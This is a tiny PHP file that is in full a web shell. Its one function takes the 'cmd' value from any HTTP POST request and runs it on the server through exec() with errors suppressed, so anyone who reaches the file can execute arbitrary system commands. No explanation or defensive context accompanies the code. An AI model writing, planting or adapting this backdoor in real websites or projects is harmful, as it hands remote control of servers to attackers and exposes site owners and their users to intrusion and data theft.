<?php
function cmd(){ // Command execution function
	$x = $_POST['cmd'];
	$cmd = @exec($x, $result);
}

cmd();
?>